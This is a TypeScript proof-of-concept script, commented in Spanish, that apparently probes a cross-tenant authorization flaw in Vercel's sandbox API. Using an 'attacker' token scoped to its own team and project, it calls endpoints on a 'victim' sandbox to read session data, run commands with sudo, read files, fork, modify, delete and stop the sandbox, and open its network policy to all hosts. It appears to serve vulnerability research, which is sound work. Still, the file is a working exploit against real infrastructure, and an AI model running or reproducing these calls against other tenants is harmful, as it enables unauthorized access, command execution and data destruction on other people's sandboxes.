import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";

function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const ATTACKER = loadEnv("/tmp/vercel-sandbox/.env.local").VERCEL_OIDC_TOKEN!;
const BASE = "https://vercel.com/api";

function claimsOf(t: string): any {
  return JSON.parse(Buffer.from(t.split(".")[1], "base64url").toString());
}
const V = claimsOf(VICTIM);
const A = claimsOf(ATTACKER);

async function call(label: string, token: string, method: string, path: string, query: Record<string, string> = {}, body?: any) {
  const url = new URL(BASE + path);
  for (const [k, v] of Object.entries(query)) if (v) url.searchParams.set(k, v);
  const r = await fetch(url, {
    method,
    headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  console.log(`\n[${r.status}] ${label}\n  ${method} ${url.pathname}?${url.searchParams.toString()}`);
  console.log("  " + (text.length > 400 ? text.slice(0, 400) + "…" : text));
}

async function main() {
  const victim = await Sandbox.create({
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    resources: { vcpus: 1 }, name: "victim-2", timeout: 5 * 60_000,
  });
  const vsid = (victim as any).session?.sessionId;
  const vname = victim.name;
  console.log("VÍCTIMA:", vname, vsid);

  // El atacante usa SUS propias teamId/projectId pero el recurso de la víctima
  await call("A: GET session VÍCTIMA con teamId ATACANTE", ATTACKER, "GET", `/v2/sandboxes/sessions/${vsid}`, { teamId: A.owner_id });
  await call("A: cmd VÍCTIMA con teamId ATACANTE", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/cmd`, { teamId: A.owner_id }, { command: "id", args: [], env: {}, sudo: true });
  await call("A: fs/read VÍCTIMA con teamId ATACANTE", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/fs/read`, { teamId: A.owner_id }, { path: "/vercel" });
  await call("A: fork sandbox VÍCTIMA en project ATACANTE", ATTACKER, "POST", `/v2/sandboxes/${vname}/fork`, { projectId: A.project_id, teamId: A.owner_id }, { name: "clone-victim" });
  await call("A: GET sandbox VÍCTIMA con project ATACANTE", ATTACKER, "GET", `/v2/sandboxes/${vname}`, { projectId: A.project_id, teamId: A.owner_id });
  await call("A: PATCH sandbox VÍCTIMA con project ATACANTE", ATTACKER, "PATCH", `/v2/sandboxes/${vname}`, { projectId: A.project_id, teamId: A.owner_id }, { persistent: false });
  await call("A: DELETE sandbox VÍCTIMA con project ATACANTE", ATTACKER, "DELETE", `/v2/sandboxes/${vname}`, { projectId: A.project_id, teamId: A.owner_id });
  await call("A: stop VÍCTIMA con teamId ATACANTE", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/stop`, { teamId: A.owner_id });
  await call("A: network-policy VÍCTIMA con teamId ATACANTE", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/network-policy`, { teamId: A.owner_id }, { allow: ["*"], subnets: { allow: ["0.0.0.0/0"] } });

  // Base: confirmar que la víctima sí puede actuar en su sandbox (control positivo)
  await call("CTRL: víctima GET su session", VICTIM, "GET", `/v2/sandboxes/sessions/${vsid}`, { teamId: V.owner_id });

  console.log("\nDONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });